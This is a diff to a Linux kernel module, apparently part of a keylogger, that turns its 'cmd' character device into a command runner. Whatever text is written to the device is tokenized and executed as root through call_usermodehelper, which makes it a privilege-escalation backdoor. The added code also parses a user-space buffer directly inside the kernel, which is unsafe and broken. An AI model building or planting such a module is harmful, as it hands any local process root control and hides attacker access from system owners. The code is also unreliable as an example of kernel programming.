@@ -12,12 +12,14 @@
 
 #define DEV_NAME "cmd"    // Name as it appears in /proc/devices
 #define DEVICE_CNT 1
+#define MAX_BUFF 512
 
 static dev_t dev;
 static struct class *cl;
 static struct cdev c_dev;
 
 static int Device_Open = 0;
+char *argv[MAX_BUFF];
 
 // Fill callback structs
 static int device_open(struct inode *, struct file *);
@@ -119,21 +121,35 @@ static ssize_t device_read(struct file *file_ptr, char *buffer,
 }
 
 /* Called when a process tries to write to the device file.
- * As in "echo hi > /dev/chardev"
  */
 static ssize_t device_write(struct file* file_ptr, const char *buff,
                             size_t len, loff_t *off)
 {
-    char *argv[] = { "/usr/bin/touch", "/test", NULL };
+    size_t strlen = strlen_user(buff);
+    char *buff_ptr = buff;
+    char *token;
+    int index = 0;
 
-    char *envp[4];
-    envp[0] = "HOME=/";
-    envp[1] = "TERM=linux";
-    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
-    envp[3] = NULL;
+    //printk(KERN_INFO "Len %d\n", len);
+    // Tokenize input buffer into a command.
+    token = strsep(&buff_ptr, " \n");
+    while (token != NULL) {
+	   //printk(KERN_INFO "Got %s\n", token);
+	// Possible if multiple sequential delimiters.
+	if (token[0] != '\0') 
+	    argv[index++] = token;
 
-    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
-    return 0;
+	if (index >= MAX_BUFF - 1)
+	    break;
+
+    	token = strsep(&buff_ptr, " \n");
+    }
+    argv[index] = NULL;
+
+    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return strlen;
 }
 
 module_init(keylog_init);
